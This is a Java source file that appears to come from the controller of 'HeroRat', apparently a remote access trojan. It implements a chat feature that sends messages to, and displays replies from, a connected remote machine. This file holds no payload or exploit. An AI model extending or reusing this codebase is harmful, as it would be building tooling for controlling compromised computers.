package net.herorat.features.chat;

import net.herorat.Main;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;
import net.herorat.network.Packet;
import net.herorat.network.Packet5Chat;


public class Chat
{
	public static void send(Server server, String username, String message)
	{
		Packet p = new Packet5Chat(server.outputstream, new String[] { username, message });
		p.write();
	}
	
	public static void handle(Server server, String[] args)
	{
		if (!server.equals(Network.findWithCombo(Main.mainWindow.panel_tab8.combo_selected_item))) return;
		
		StringBuffer buffer = new StringBuffer();
		for (String arg : args)
		{
			buffer.append(arg);
		}
		
		server.buffer_chat.append(server.getServerName() + ": " + buffer.toString() + "\n");
		Main.mainWindow.panel_tab8.area_chat.setText(server.buffer_chat.toString());
	}
}